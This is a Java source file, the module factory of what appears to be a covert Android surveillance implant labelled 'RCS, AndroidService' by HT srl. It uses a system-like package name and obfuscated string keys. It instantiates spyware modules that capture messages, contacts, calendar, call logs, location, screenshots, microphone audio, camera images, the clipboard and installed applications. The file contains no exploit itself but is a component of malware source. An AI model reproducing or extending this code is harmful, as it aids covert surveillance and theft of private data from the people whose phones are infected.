/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import com.android.service.Messages;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class FactoryModule implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = new NullModule();

		if (Messages.getString("c.0").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("c.1").equals(type)) { //$NON-NLS-1$
			a = new ModuleAddressBook();
		} else if (Messages.getString("c.2").equals(type)) { //$NON-NLS-1$
			a = new ModuleCalendar();
		} else if (Messages.getString("c.3").equals(type)) { //$NON-NLS-1$
			a = new ModuleCallList();
		} else if (Messages.getString("c.4").equals(type)) { //$NON-NLS-1$
			a = new ModuleDevice();
		} else if (Messages.getString("c.5").equals(type)) { //$NON-NLS-1$
			a = new ModulePosition();
		} else if (Messages.getString("c.6").equals(type)) { //$NON-NLS-1$
			a = new ModuleSnapshot();
		} else if (Messages.getString("c.7").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("c.8").equals(type)) { //$NON-NLS-1$
			a = new ModuleMic();
		} else if (Messages.getString("c.9").equals(type)) { //$NON-NLS-1$
			a = new ModuleCamera();
		} else if (Messages.getString("c.10").equals(type)) { //$NON-NLS-1$
			a = new ModuleClipboard();
		} else if (Messages.getString("c.11").equals(type)) { //$NON-NLS-1$
			a = new ModuleCrisis();
		} else if (Messages.getString("c.12").equals(type)) { //$NON-NLS-1$
			a = new ModuleApplication();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
			}
		}

		return a;
	}
}
